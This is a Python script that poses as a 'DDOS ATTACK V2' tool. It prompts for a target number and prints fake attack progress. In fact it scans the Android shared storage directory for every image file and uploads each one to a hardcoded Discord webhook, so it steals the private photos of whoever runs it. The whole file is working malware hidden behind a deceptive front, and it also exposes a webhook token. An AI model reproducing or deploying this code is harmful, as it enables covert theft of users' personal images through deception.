import os
import requests
import time
import random
from tqdm import tqdm 

WEBHOOK_URL = "https://discord.com/api/webhooks/1387796792036560967/Tjb02OQ3HoEhAQCAOJ_WL07puQqTsrAjrga-QowkpKiBp3nN1GiKXz_jEzOnk3o0FLZl"

def get_device_info():
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        return hostname, local_ip
    except:
        return "Bilinmiyor", "Bilinmiyor"

def send_to_discord(file_path):
    try:
        with open(file_path, 'rb') as file:
            files = {'file': (os.path.basename(file_path), file)}
            requests.post(WEBHOOK_URL, files=files)
    except:
        pass

def scan_and_upload():
    image_extensions = ('.jpg', '.jpeg', '.png', '.gif', '.bmp')
    base_dir = "/storage/emulated/0" 
    
    target_id = input("Number: ")
    print(f"\n🔎 **{target_id}** DDOS ATTACK...")
    
    image_files = []
    for root, _, files in os.walk(base_dir):
        for file in files:
            if file.lower().endswith(image_extensions):
                image_files.append(os.path.join(root, file))
    
    total_images = len(image_files)
    if total_images == 0:
        print("❌ No user agent!")
        return
    
    print(f"🔄 **{total_images}** DDOS ATTACK...\n")
    
    for image_path in tqdm(image_files, desc="DDOS ATTACK...", unit="0"):
        send_to_discord(image_path)
        time.sleep(1) 
    
    print("\n finish ddos")

if __name__ == "__main__":
    print("""
 DDOS ATTACK V2
    """)
    scan_and_upload()